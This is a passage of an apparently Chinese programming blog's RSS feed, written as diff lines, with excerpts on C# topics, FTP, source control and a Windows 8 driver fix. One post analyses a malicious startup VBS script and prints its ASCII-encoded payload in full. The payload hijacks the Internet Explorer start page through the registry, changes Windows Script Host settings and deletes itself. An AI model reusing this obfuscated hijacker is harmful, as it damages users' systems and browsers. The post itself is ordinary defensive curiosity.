+for (int i = 0; i &amp;amp;lt; 10000; i++) { ShuffleArray_Manual(_arr); SumCount(_arr); } int j = 0; foreach (int i in result) { if (j % result.GetLength(1) == 0) { Console.WriteLine(); } Console.</description>
+    </item>
+    
+    <item>
+      <title>一个恶意vbs脚本的简单解码</title>
+      <link>https://leizhiyuan.github.io/2012/11/25/%E4%B8%80%E4%B8%AA%E6%81%B6%E6%84%8Fvbs%E8%84%9A%E6%9C%AC%E7%9A%84%E7%AE%80%E5%8D%95%E8%A7%A3%E7%A0%81/</link>
+      <pubDate>Sun, 25 Nov 2012 09:00:59 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/11/25/%E4%B8%80%E4%B8%AA%E6%81%B6%E6%84%8Fvbs%E8%84%9A%E6%9C%AC%E7%9A%84%E7%AE%80%E5%8D%95%E8%A7%A3%E7%A0%81/</guid>
+      <description>今天把电脑还原到了11月7号。结果eset更新后报C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup这个目录有个zzs.vbs的不受欢迎的程序，当时没什么事，就打开看看。想知道是个什么东西。
+由于eset阻止，我就把文件拖出来。改个后缀。发现代码不长，前半段是ascii码编码的。。 strs = Array(68,111,13,10,32,32,32,32,83,101,116,32,111,98,106,87,77,73,83,101,114,118,105,99,101,32,61,32,71,101,116,79,98,106,101,99,116,40,34,119,105,110,109,103,109,116,115,58,92,92,46,92,114,111,111,116,92,99,105,109,118,50,34,41,13,10,32,32,32,32,83,101,116,32,99,111,108,80,114,111,99,101,115,115,101,115,32,61,32,111,98,106,87,77,73,83,101,114,118,105,99,101,46,69,120,101,99,81,117,101,114,121,40,34,83,101,108,101,99,116,32,42,32,102,114,111,109,32,87,105,110,51,50,95,80,114,111,99,101,115,115,34,41,13,10,32,32,32,32,70,111,117,110,100,80,114,111,99,101,115,115,32,61,32,48,13,10,32,32,32,32,70,111,114,32,69,97,99,104,32,111,98,106,80,114,111,99,101,115,115,32,73,110,32,99,111,108,80,114,111,99,101,115,115,101,115,13,10,32,32,32,32,32,32,32,32,73,102,32,111,98,106,80,114,111,99,101,115,115,46,78,97,109,101,32,61,32,34,117,115,101,114,105,110,105,116,46,101,120,101,34,32,84,104,101,110,13,10,32,32,32,32,32,32,32,32,32,32,32,32,70,111,117,110,100,80,114,111,99,101,115,115,32,61,32,49,13,10,32,32,32,32,32,32,32,32,32,32,32,32,69,120,105,116,32,70,111,114,13,10,32,32,32,32,32,32,32,32,69,110,100,32,73,102,13,10,32,32,32,32,78,101,120,116,13,10,32,32,32,32,73,102,32,70,111,117,110,100,80,114,111,99,101,115,115,32,61,32,48,32,84,104,101,110,32,69,120,105,116,32,68,111,13,10,32,32,32,32,87,83,99,114,105,112,116,46,83,108,101,101,112,32,49,48,48,13,10,76,111,111,112,13,10,13,10,115,80,97,103,101,32,61,32,34,104,116,116,112,58,47,47,119,119,119,46,57,57,57,46,99,111,109,47,63,111,110,101,34,13,10,13,10,83,101,116,32,111,98,106,83,104,101,108,108,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108,108,34,41,13,10,111,98,106,83,104,101,108,108,46,82,101,103,87,114,105,116,101,32,34,72,75,67,85,92,83,111,102,116,119,97,114,101,92,77,105,99,114,111,115,111,102,116,92,73,110,116,101,114,110,101,116,32,69,120,112,108,111,114,101,114,92,77,97,105,110,92,83,116,97,114,116,32,80,97,103,101,34,44,32,115,80,97,103,101,13,10,13,10,115,82,101,103,80,97,116,104,32,61,32,34,72,75,76,77,92,83,79,70,84,87,65,82,69,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,32,83,99,114,105,112,116,32,72,111,115,116,92,83,101,116,116,105,110,103,115,34,13,10,79,110,32,69,114,114,111,114,32,82,101,115,117,109,101,32,78,101,120,116,13,10,105,69,110,97,98,108,101,100,32,61,32,111,98,106,83,104,101,108,108,46,82,101,103,82,101,97,100,32,95,13,10,40,115,82,101,103,80,97,116,104,32,38,32,34,92,69,110,97,98,108,101,100,95,34,41,13,10,73,102,32,69,114,114,46,78,117,109,98,101,114,32,61,32,48,32,84,104,101,110,13,10,32,32,32,32,111,98,106,83,104,101,108,108,46,82,101,103,87,114,105,116,101,32,115,82,101,103,80,97,116,104,32,38,32,34,92,69,110,97,98,108,101,100,34,44,32,105,69,110,97,98,108,101,100,44,32,34,82,69,71,95,68,87,79,82,68,34,13,10,32,32,32,32,111,98,106,83,104,101,108,108,46,82,101,103,68,101,108,101,116,101,32,115,82,101,103,80,97,116,104,32,38,32,34,92,69,110,97,98,108,101,100,95,34,13,10,69,110,100,32,73,102,13,10,13,10,83,101,116,32,111,98,106,83,104,101,108,108,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,83,99,114,105,112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109,79,98,106,101,99,116,34,41,13,10,83,101,116,32,102,32,61,32,111,98,106,83,104,101,108,108,46,71,101,116,70,105,108,101,40,87,83,99,114,105,112,116,46,83,99,114,105,112,116,70,117,108,108,78,97,109,101,41,13,10,73,102,32,102,46,65,116,116,114,105,98,117,116,101,115,32,65,110,100,32,49,32,84,104,101,110,32,102,46,65,116,116,114,105,98,117,116,101,115,32,61,32,102,46,65,116,116,114,105,98,117,116,101,115,32,45,32,49,13,10,111,98,106,83,104,101,108,108,46,68,101,108,101,116,101,70,105,108,101,32,87,83,99,114,105,112,116,46,83,99,114,105,112,116,70,117,108,108,78,97,109,101) 后半段是 For i = 0 To UBound(strs) runner = runner &amp;amp; Chr(strs(i)) Next Execute runner 虽说对vbs不怎么熟，但也知道vbs经常用来写个启动项啊。加个用户啊。之类的。后半句很好懂。就是把ascii码转换成字符串，然后执行。字面意思看看就行了。其实应该可以直接将Execute runner 改为 MsgBox runner就能输出了。但eset不能关闭。所以最后还是选择用C#来写了。
+解码嘛。很简单。VS刚好开着。直接写吧。 byte[] strs = {68，101,116,70,105,108,101,40,87,83,99,114,105,112,116,46,83,99,114,105,112,116,70,117,108,108,78,97,109,101,41,13,10,73,102,32,102,46,65,116,116,114,105,98,117,116,101,115,32,65,110,100,32,49,32,84,104,101,110,32,102,46,65,116,116,114,105,98,117,116,101,115,32,61,32,102,46,65,116,116,114,105,98,117,116,101,115,32,45,32,49,13,10,111,98,106,83,104,101,108,108,46,68,101,108,101,116,101,70,105,108,101,32,87,83,99,114,105,112,116,46,83,99,114,105,112,116,70,117,108,108,78,97,109,101}; System.Text.ASCIIEncoding asciiEncoding = new System.Text.ASCIIEncoding(); Console.WriteLine(asciiEncoding.GetString(strs)); 运行后输出 Do Set objWMIService = GetObject(&amp;ldquo;winmgmts:\.\root\cimv2&amp;rdquo;) Set colProcesses = objWMIService.ExecQuery(&amp;ldquo;Select * from Win32_Process&amp;rdquo;) FoundProcess = 0 For Each objProcess In colProcesses If objProcess.Name = &amp;ldquo;userinit.exe&amp;rdquo; Then FoundProcess = 1 Exit For End If Next If FoundProcess = 0 Then Exit Do WScript.</description>
+    </item>
+    
+    <item>
+      <title>获取操作系统版本信息</title>
+      <link>https://leizhiyuan.github.io/2012/11/23/%E8%8E%B7%E5%8F%96%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF/</link>
+      <pubDate>Fri, 23 Nov 2012 13:24:50 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/11/23/%E8%8E%B7%E5%8F%96%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF/</guid>
+      <description>坊间流传的代码都有些问题，比如不能正常获取win7以上的版本信息，不能获取诸如专业版，旗舰版等的信息，不能正常获取操作系统位的信息。
+使用代码，写了一个简单的库来实现效果。用法大概如下： StringBuilder sb = new StringBuilder(String.Empty); sb.AppendLine(&amp;ldquo;Operation System Information&amp;rdquo;); sb.AppendLine(&amp;ldquo;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;-&amp;rdquo;); sb.AppendLine(String.Format(&amp;ldquo;Name = {0}&amp;rdquo;, OSVersionInfo.Name)); sb.AppendLine(String.Format(&amp;ldquo;Edition = {0}&amp;rdquo;, OSVersionInfo.Edition)); if (OSVersionInfo.ServicePack!=string.Empty) sb.AppendLine(String.Format(&amp;ldquo;Service Pack = {0}&amp;rdquo;, OSVersionInfo.ServicePack)); else sb.AppendLine(&amp;ldquo;Service Pack = None&amp;rdquo;); sb.AppendLine(String.Format(&amp;ldquo;Version = {0}&amp;rdquo;, OSVersionInfo.VersionString)); sb.AppendLine(String.Format(&amp;ldquo;ProcessorBits = {0}&amp;rdquo;, OSVersionInfo.ProcessorBits)); sb.AppendLine(String.Format(&amp;ldquo;OSBits = {0}&amp;rdquo;, OSVersionInfo.OSBits)); sb.AppendLine(String.Format(&amp;ldquo;ProgramBits = {0}&amp;rdquo;, OSVersionInfo.ProgramBits));
+textBox1.Text = sb.ToString(); 对比一下坊间的几种不足： 总的来说。最大的问题就是不能正确检测你的操作系统到底是32位还是64位。几种方法大致如下： 1. 使用IntPtr指针的大小 最关键的一句代码是： return IntPtr.Size * 8; 但是事实上，这个返回的不是操作系统的位数，返回的是运行的程序的位数，如果在64位的windows上以32位的模式运行了这个程序，那么就会返回32.
+2. 使用PROCESSOR_ARCHITECTURE 环境变量 string pa = Environment.GetEnvironmentVariable(&amp;ldquo;PROCESSOR_ARCHITECTURE&amp;rdquo;); return ((String.IsNullOrEmpty(pa) || String.</description>
+    </item>
+    
+    <item>
+      <title>解决win8无法上网的问题</title>
+      <link>https://leizhiyuan.github.io/2012/11/21/%E8%A7%A3%E5%86%B3win8%E6%97%A0%E6%B3%95%E4%B8%8A%E7%BD%91%E7%9A%84%E9%97%AE%E9%A2%98/</link>
+      <pubDate>Wed, 21 Nov 2012 16:29:20 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/11/21/%E8%A7%A3%E5%86%B3win8%E6%97%A0%E6%B3%95%E4%B8%8A%E7%BD%91%E7%9A%84%E9%97%AE%E9%A2%98/</guid>
+      <description>昨天晚上@虎振兴同学装了win8.。结果悲剧了。症状为连接宽带可以连接上。上qq也正常。但是。只要打开网页。就会自动断网。再连接就会提示651错误了。网上大多说是驱动不兼容。但是解决的方法大部分是不对的。下面结合网上的给大家说一说。。
+网卡驱动目测是都是美满公司，也就是Marvell 的Yukon系列网卡驱动的问题。首先下载一个旧版本的驱动（32位下载/64位下载） 然后按下图操作，第一步是打开计算机-管理。。各种姿势只要打开了计算机管理就可以了。  在这里稍微记一下这个名字。Marvell Yukon 88exxxxx PCI-E Fast Ethernet..  找到网络适配器，右键更新驱动程序。    注意记下兼容的网卡。名字和第二步的差不多的那个，点击从磁盘安装，选择下载后驱动的解压的安装文件，如图  到这一步以后，点击打开，可能会出现一个驱动列表。这是时候选择一个和兼容列表名字一样的。88e这部分不一样。如果找不到，也可以找类似的，比如途中给出的后两位是39.我装的是40也没问题。这个是驱动的历史版本。然后就可以了 
+最后。提醒各位童鞋。win8整体还是很不错的。不过呢。对于我来说。metro界面和正常的界面的傻傻分不清楚的模式。令我很是蛋疼。。所以暂时没有考虑换到win8.。。</description>
+    </item>
+    
+    <item>
+      <title>类型安全的黑板模式（属性包）</title>
+      <link>https://leizhiyuan.github.io/2012/10/16/%E7%B1%BB%E5%9E%8B%E5%AE%89%E5%85%A8%E7%9A%84%E9%BB%91%E6%9D%BF%E6%A8%A1%E5%BC%8F%E5%B1%9E%E6%80%A7%E5%8C%85/</link>
+      <pubDate>Tue, 16 Oct 2012 12:12:06 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/10/16/%E7%B1%BB%E5%9E%8B%E5%AE%89%E5%85%A8%E7%9A%84%E9%BB%91%E6%9D%BF%E6%A8%A1%E5%BC%8F%E5%B1%9E%E6%80%A7%E5%8C%85/</guid>
+      <description>有时候对于对象来说。在一个软件中，不直接通过互相引用而做到共享信息是非常有用的。比如像带有插件的软件。可以互相进行通信。假设我们有了很多对象。其中一些包含一些数据。而另一些对象需要消费这些数据 不同的子集，我们不通过对数据生产者和消费者的直接引用来实现，而是通过更低耦合的方式。叫做创建一个“BlackBoard”（黑板）对象。该对象允许其他对象自由对其进行读取/写入数据。这种解耦方式使得消费者不知道也不必知道数据来自哪里。如果想要了解更多关于黑板模式的信息。我们常说的。Google是你最好的朋友。
+一个最简单的黑板对象应该是 Dictionary一些简单的命名值的字典。所有的对象共享同一个字典引用。使得他们可以交换这些命名数据。这种方法有两个问题。一个是名字。一个是类型安全—数据生产者和消费者对每一个数据值都必须共享一个字符串标识。消费者也没有对字典中的值进行编译时的类型检查，比如，可能期望一个小数，结果运行时读到了字符串。本文对这两个问题演示了一种解决方案。
+背景
+最近我在开发一个通用任务的异步执行的引擎。我的通用任务通常有Do/Undo方法。原则上是相互独立的，但是有一些任务需要从已经执行的任务重请求数据。比如。一个任务可以 为一个硬件设备建立一个API，随后的任务就可以使用创建好的API来操作硬件设备。但是。我不想我的执行引擎知道关于这个执行任务的任何信息。而且。我也不想直接手工的就在一个任务里引用另一个任务。
+黑板类
+黑板类本质上是一个Dictionary的包装类，对外暴露Get和Set方法。黑板类允许其他对象存储并且取回数据。但是要求这些数据使用一个 BlackboardProperty 类型的标识符来表示这些数据是可存取的。BlackboardProperty 对象应该在那些准备读写黑板类的对象之间共享，因此，他应该在那些类中作为一个静态成员。（很像WPF的依赖属性。是他们所属控件的静态成员）
+注意：命名安全应该可以通过同样的方式实现。但是但是依然没有解决类型安全的问题。那么。到了主要的部分了。那就是黑板类的代码了 public class Blackboard : INotifyPropertyChanged, INotifyPropertyChanging { Dictionary&amp;lt;string, object&amp;gt; _dict = new Dictionary&amp;lt;string, object&amp;gt;();
+public T Get&amp;amp;lt;T&amp;amp;gt;(BlackboardProperty&amp;amp;lt;T&amp;amp;gt; property) { if (!_dict.ContainsKey(property.Name)) _dict[property.Name] = property.GetDefault(); return (T)_dict[property.Name]; } public void Set&amp;amp;lt;T&amp;amp;gt;(BlackboardProperty&amp;amp;lt;T&amp;amp;gt; property, T value) { OnPropertyChanging(property.Name); _dict[property.Name] = value; OnPropertyChanged(property.Name); } #region property change notification public event PropertyChangingEventHandler PropertyChanging; public event PropertyChangedEventHandler PropertyChanged; protected virtual void OnPropertyChanging(string propertyName) { if (PropertyChanging !</description>
+    </item>
+    
+    <item>
+      <title>C#编写FTP客户端软件</title>
+      <link>https://leizhiyuan.github.io/2012/10/09/c#%E7%BC%96%E5%86%99ftp%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BD%AF%E4%BB%B6/</link>
+      <pubDate>Tue, 09 Oct 2012 09:06:16 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/10/09/c#%E7%BC%96%E5%86%99ftp%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BD%AF%E4%BB%B6/</guid>
+      <description>1 介绍 我知道。网上有很多现成的FTP软件。但是。我们也想要了解FTP的一些底层机构，因此。 这个开源的项目在你学习FTP知识的时候也许对你有些帮组。程序的界面看起来像FileZilla，FileZilla虽然流行但是有些bug，当我打开我博客的时候总是有问题。我需要通过FTP连接我的服务器。发送文件，下载文件等等。因为。我决定写我自己的软件来处理所有的情况。FileZilla足够好。但它不是我的。
+&amp;nbsp;
+2 背景 &amp;nbsp;
+看看我们已经知道的。我们知道FTP是一个标准的基于TCP网络协议。用于从一个主机向另一个主机传输文件。它是一个C/S架构。
+&amp;nbsp;
+图2
+
+&amp;nbsp;
+FTP程序曾经是基于命令行的。我们仍沿可以通过cmd.exe连接FTP服务器。因为FTP的确可以通过命令来操作。举个例子。我们可以在命令行使用“stor”命令来发送文件。为了完成这些请求。FTP服务器需要一直运行等待即将到来的客户端请求。我们可以从来自维基百科的解释更好的理解FTP：
+&amp;nbsp;
+客户端计算机可以通过服务器的21端口和服务器通信。叫做控制连接。它在一次会话期间保持开放。第一次连接的时候。叫做数据连接,服务器可以对客户端打开20端口（主动模式），建立一条数据通路，连接上客户端传输数据。或者客户端打开一个随机的端口（被动模式），去连接服务器，来传输数据。控制连接使用一个类似Telnet的协议，被用作客户端和服务器会话管理（命令，标识，密码）。。比如。&amp;rdquo;RETR filename&amp;ldquo; 会从服务器端下载文件。
+图三
+一个完整的FTP文件传输需要建立两种类型的连接，一种为文件传输下命令，称为控制连接，另一种实现真正的文件传输，称为数据连接。
+&amp;nbsp;
+&amp;nbsp;
+服务器 通过三位ASCII的数字状态码，可能包含可选的描述信息，在控制连接上做出回应。比如。“200”或者是“200 OK”,表示上一条命令成功了。数字代表编号，描述信息给出了一些说明（比如“OK”）,或者可能是一些需要的参数(比如需要帐号来存储文件)，那么我们需要怎么做呢。很明显。发送命令，接收“OK”回应，发送数据。接收数据。完了。但是首先需要服务器已经准备好了。FTP服务器可以在主动和被动两种模式下运行。主动模式是基于服务器的连接而被动模式是基友客户端的连接。继续看。
+&amp;nbsp;
+&amp;nbsp;
+&amp;nbsp;
+在主动连接中，客户端把自己的ip和端口发送给服务器。然后服务器尝试连接到客户端，但是可能会因为防火墙的原因而被拒绝。我们在windows上都会使用反病毒/自带防火墙。是吧。那么我们来看看被动模式
+&amp;nbsp;
+在被动连接中。服务器通过一个“PASV”命令把自己的ip和端口发送给客户端。然后客户端通过该IP尝试连接服务器。对于发送文件非常有用。当我们发送文件的时候。优先使用“PASV”模式，如你们所说。大多数协议。像FTP/HTTP 使用ASCII编码，因为全球可用。因此我们会使用这种编码。你可以从下面得到FTP的命令列表
+&amp;nbsp;
+主动和被动都是对于服务器端来说的
+3 使用代码 现在我们已经为编写软件做好准备了。我们写些有用的代码吧。：）首先。我们“打开文件对话框”，集成到我们的窗体里。
+&amp;nbsp;
+3.1 资源管理器组件 &amp;nbsp;
+我们需要一个资源管理器组件在软件界面可以看到我们所有的文件。这样我们才可以选择哪些文件来发送到FTP服务器，新建一个Windows窗体控件库（下载包中提供了）
+&amp;nbsp;
+图四
+
+&amp;nbsp;
+最后看起来样子是上面这样。先添加一个TreeView，一些按钮，和一个搜索功能  TreeView.Nodes.Clear();
+TreeNode nodeD = new TreeNode();
+nodeD.Tag = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+nodeD.Text = &amp;ldquo;Desktop&amp;rdquo;;
+nodeD.ImageIndex = 10;
+nodeD.SelectedImageIndex = 10;
+TreeView.Nodes.Add(nodeD); &amp;nbsp;</description>
+    </item>
+    
+    <item>
+      <title>接口VS 委托</title>
+      <link>https://leizhiyuan.github.io/2012/10/07/%E6%8E%A5%E5%8F%A3vs-%E5%A7%94%E6%89%98/</link>
+      <pubDate>Sun, 07 Oct 2012 08:31:54 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/10/07/%E6%8E%A5%E5%8F%A3vs-%E5%A7%94%E6%89%98/</guid>
+      <description>背景 对于指定的任务有不同的方案可供选择，通常是很好的。因为可能某一种方案会更加适合该任务，但是有时候做决定会很难。因为这些不同的方案有其各自的优缺点。
+我经常会停下来好好想想，是不是接口比委托更适合或者是更不适合某个任务。有时候我甚至会回去看我写的代码，这些代码刚开始使用委托来实现，我后来用接口替换掉。因此，是时候写篇文章来阐述一下这两种技术的优缺点了。
+&amp;nbsp;
+性能 我经常看到有人问接口是不是比委托更快啊。或者是不是相反。通常。别人给的答案会是：
+ 接口更快。委托相当慢 委托更快，因为他们是指向方法的指针，接口则需要一个v-table(虚函数解析表)，然后找到委托 他们一样快，但委托更容易使用 &amp;nbsp;  好吧。那些都是错的。也许在.Net 1中。委托真的很慢。但是事实是：
+ 委托执行（execute）的时候更快 接口获得（get）的时候更快 在下面这段代码中：  &amp;nbsp; Action action = SomeMethod; 我们将得到一个Action(委托类型)来调用SomeMethod。问题是：委托是包含被调用方法的实例和指针的引用类型。而不仅仅只是一个指向方法的指针，通过引用类型，委托需要分配内存，因此，每一次你把一个方法变换成一个委托的时候。都会分配一个新的对象。
+如果委托是一个值类型。会有些不一样。但是他们不是。。
+另一方面，如果我们这样写代码： IRunnable runnable = this; &amp;nbsp;
+如果实现了IRunnable接口的对象。我们简单通过一个转换得到同样的引用。没有涉及内存分配。我们将可以通过下面的代码来进行速度比较：
+对于委托： Stopwatch stopwatch = new Stopwatch(); stopwatch.Start(); for(int i=0; i&amp;lt;COUNT; i++) { Action action = SomeMethod; action(); } stopwatch.Stop(); Console.WriteLine(stopwatch.Elapsed); &amp;nbsp;
+对于接口 Stopwatch stopwatch = new Stopwatch(); stopwatch.Start(); for(int i=0; i&amp;lt;COUNT; i++) { IRunnable runnable = this; runnable.</description>
+    </item>
+    
+    <item>
+      <title>关于源代码控制的五个误区</title>
+      <link>https://leizhiyuan.github.io/2012/10/04/%E5%85%B3%E4%BA%8E%E6%BA%90%E4%BB%A3%E7%A0%81%E6%8E%A7%E5%88%B6%E7%9A%84%E4%BA%94%E4%B8%AA%E8%AF%AF%E5%8C%BA/</link>
+      <pubDate>Thu, 04 Oct 2012 12:18:57 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/10/04/%E5%85%B3%E4%BA%8E%E6%BA%90%E4%BB%A3%E7%A0%81%E6%8E%A7%E5%88%B6%E7%9A%84%E4%BA%94%E4%B8%AA%E8%AF%AF%E5%8C%BA/</guid>
+      <description>上周，在Red Gate好朋友的帮助下。我发起了一个名为小竞赛赢得优秀的SQL Source Control 5份授权的活动。参加的方式很简单-分享你使用源代码控制过程中，本可以避免的最痛苦的经历
+许多痛苦的故事都出现了。但是我认为这五个获奖者的故事值得分享，并且我都做了评论，因为我觉得随着时间的流逝，这些故事依然对我们有所启发。那么，开始享受这些故事吧，我希望这些知识中的闪光点能够帮助你以后不会掉进相同的陷阱里。
+给获奖者：希望那些授权可以帮助抚慰你们关于那些已经过去的痛苦记忆。不久我会联系你们关于奖项颁发的相关事宜。
+&amp;nbsp;
+1.通过Ctrl-Z来进行源代码控制
+第一个故事来自 courtesy of MyChickenNinja ，仅仅文字就看得我头疼。在这个特殊的故事里。应用程序被前员工破坏了。。这非常头疼。但是至少还是有很多方法可以恢复代码的。如果不要求数据的话。。
+第一个问题是备份，最近的备份已经是3周前的。这绝对是一个教训—你的环境真的备份了吗？一会我会在另一个故事里简单的再说到这个问题。故事的核心部分是通过Ctrl-Z来进行伪源代码控制
+他们运行他们的代码，并且不断地更新，也包括开发环境，并且使用Ctrl-Z来撤销坏的改变
+好吧。这实在令人难以置信-如果你的应用程序已经做了一些编辑。然后被关闭了。怎么办？或者PC关机了？等等—他还说他们在哪写代码，哪儿就是开发环境？记住！撤销不是源代码控制！
+&amp;nbsp;
+2。多个数据库和集成问题
+第二个故事来自Brandon Thompson，他极度不开心，因为他工作在一个有着很多数据库源的环境里，并且，这些数据库都在正在进行的开发项目下面，数据库集成非常困难，这就意味着处理多个数据库备份可能还有个在海外。。
+我们的开发团队在海外，因为他们有他们自己的数据库集，这些数据库我从没看到过。但是他们会把改变的文件发给我们来适应我们的开发环境
+我发现最痛苦的是简单重复的手工劳动仅仅是使得大家能够协同的更好。这是没有一点创新并且没有任何增值的行为，比如增加新的特性，这就导致除了干这些。没什么时间真正在写代码了。
+源代码控制是为了能够保证团队之间平稳尽量无摩擦的一起工作。它是项目的一个润滑剂，和持续集成开发还有自动部署都属于同一类。这些都是软件开发中的“面包和黄油”，是任何成功团队编写代码的基础。
+&amp;nbsp;
+3. 依赖未测试的备份
+下一个是Barry Anderson，他写了一个我们都曾经经历过的痛苦：不能从备份恢复了！事实上在Barry的故事里。几个月都没备份了。之前备份本身还是坏的。这太糟糕了。但是，对于那些依赖备份的人来说这是一个严重的疏忽。
+当然对于这个疏忽也有自己的借口。Barry解释道：
+我们的经理（不是存储团队的）后来告诉我们既没时间也没空间来测试备份了。。。
+备份是一件很重要的事情。但从备份可以恢复也是同等重要，我最近在配置大量的新环境的时候，备份本应该发生的但是就是没有发生。只有当我坚持要进行恢复测试的时候，问题才浮出水面，对于很多人来说。只有当他们真的需要从一系列的数据丢失中恢复数据的时候，才发现不能恢复了。。测试你的备份，恢复他们，不要相信任何人的说辞.
+&amp;nbsp;
+4.人工合并工具
+来自Graham Sutherland的故事讲了一个人来做机器工作的故事
+我们有一些开发人员，每一个在他们的硬盘上的都有整个项目的一个副本，每一次一个改变发生的时候，我们就会下载技术老大改变的源代码，然后使用diff工具来查看改变。然后手工更新他们。一行一行。。全靠双手。。
+这个故事比听起来还要不可思议，在源代码控制工具出现以前这确实是存在的。一个海外开发团队成员就是这样干的。随后他们这样解释：带头的开发者需要在提交前检查其他开发人员的工作进度。
+这确实是类似于之前的观点,在有多个数据库集成的情况下;我们有技术来解决这些问题!每当一个人在软件开发中从事任何劳动密集型,重复的过程,你真的不得不停下来问:“有没有更好的方法?”通常是有的。
+&amp;nbsp;
+5.剪切和粘贴版本控制
+Robin Vessey 让我产生了共鸣，因为它真的是伪VCS（Version Control System）最普遍的方式。剪切或者复制，然后粘贴到新的位置，通过这种方式会包含重复的目录或者文件。因此一般这些文件会被以日期或者其他标识符来标识时间帧。
+在Robin的故事里，他打算通过网络移动一个目录结构。
+他很简单但高效，我剪贴然后粘贴了一个完整的目录树，任何东西，通过网络发送。但这些文件留在了我这一边。却没有到达另一边。我仍然不知道为什么。
+我必须承认,我对任何剪切和粘贴文件的操作的态度是非常谨慎的,因为我看到这种情况在一个本地文件系统中发生了很多次，更不用说通过网络了，在上面的的Robin的故事,就是没有备份被恢复,因为他们一段时间后会停止备份，“因为我们没有更多的空间”。是不是感觉好像和前面某一方法很像。。
+&amp;nbsp;
+总结
+工作在一个没有源代码控制的环境下是很可怕的。现在就停止吧。伙计们，我们是很优秀，但在在源代码控制下工作是很专业的。并且现在有很多的VCS产品。托管服务，集成工具，真心是没有任何理由不把代码-包括数据库，部署在源代码控制下。
+&amp;nbsp;
+原文地址:5-ways-to-do-source-control-really
+著作权声明：本文由http://leaver.me 翻译，欢迎转载分享。请尊重作者劳动，转载时保留该声明和作者博客链接，谢谢！</description>
+    </item>
+    
+    <item>
+      <title>简单扩展方法增强代码可读性</title>
+      <link>https://leizhiyuan.github.io/2012/10/04/%E7%AE%80%E5%8D%95%E6%89%A9%E5%B1%95%E6%96%B9%E6%B3%95%E5%A2%9E%E5%BC%BA%E4%BB%A3%E7%A0%81%E5%8F%AF%E8%AF%BB%E6%80%A7/</link>
+      <pubDate>Thu, 04 Oct 2012 09:03:48 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/10/04/%E7%AE%80%E5%8D%95%E6%89%A9%E5%B1%95%E6%96%B9%E6%B3%95%E5%A2%9E%E5%BC%BA%E4%BB%A3%E7%A0%81%E5%8F%AF%E8%AF%BB%E6%80%A7/</guid>
+      <description>本文技术含量不高，但是思路可以借鉴。。
+介绍
+当你处理计时器，时间间隔，或是其他关于日期的计算的时候。你必然会使用TimeSpan类。
+我觉得写出下面的代码可读性并不好。。 // 1个表示5小时的时间间隔 var theTimespan = new TimeSpan(0, 5, 0, 0, 0); 而下面的代码就要好一些 //一个表示5小时的时间间隔 var theTimespan = 5.Hours();  扩展方法
+使用这些扩展了int类的方法。可以使得创建TimeSpan可读性更好 public static TimeSpan Days(this int value) { return new TimeSpan(value, 0, 0, 0, 0); }
+public static TimeSpan Years(this int value) { var dt = DateTime.Now.AddYears(value); return (dt - DateTime.Now).Duration(); }
+public static TimeSpan Hours(this int value) { return new TimeSpan(0, value, 0, 0, 0); }</description>
+    </item>
+    
+    <item>
+      <title>C#使用Graphics创建饼图</title>
+      <link>https://leizhiyuan.github.io/2012/09/27/c#%E4%BD%BF%E7%94%A8graphics%E5%88%9B%E5%BB%BA%E9%A5%BC%E5%9B%BE/</link>
+      <pubDate>Thu, 27 Sep 2012 13:47:25 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/09/27/c#%E4%BD%BF%E7%94%A8graphics%E5%88%9B%E5%BB%BA%E9%A5%BC%E5%9B%BE/</guid>
+      <description>介绍 这个程序是使用C#中的Graphics来创建一个饼图的，我已经尽我所能写的很好了。如果你有任何建议可以分享给我，这样我也能从中学习。
+使用代码 最近我迷上了Graphics类。我仅仅体验了一下Graphics的DrawPie() 和FillPie() 方法。
+最为一个简单的Demo，我创建一个有着五个文本框的窗体，一个按钮，一个图片框。一会我就把饼图画在图片框里
+ 在创建一个饼图之前，我们头脑里要有这个意识。我们不能创建一个不符合常规的圆，创建圆我们需要度数信息。
+为了转换度数。我们首先把给定的值做个求和。然后得出文本框里所有值的和。然后呢。用每个值除以总值再乘以360度。 代码如下： int i1 = Int32.Parse(textBox1.Text); int i2 = Int32.Parse(textBox2.Text); int i3 = Int32.Parse(textBox3.Text); int i4 = Int32.Parse(textBox4.Text); int i5 = Int32.Parse(textBox5.Text);
+float total = i1 + i2 + i3 + i4 + i5 ;
+float deg1 = (i1 / total) * 360; float deg2 = (i2 / total) * 360; float deg3 = (i3 / total) * 360; float deg4 = (i4 / total) * 360; float deg5 = (i5 / total) * 360; 值转换完毕后。我们可以创建Graphics类的实例了。</description>
+    </item>
+    
+    <item>
+      <title>C#删除文件和文件夹到回收站</title>
+      <link>https://leizhiyuan.github.io/2012/09/24/c#%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6%E5%92%8C%E6%96%87%E4%BB%B6%E5%A4%B9%E5%88%B0%E5%9B%9E%E6%94%B6%E7%AB%99/</link>
+      <pubDate>Mon, 24 Sep 2012 08:04:45 +0000</pubDate>
+      
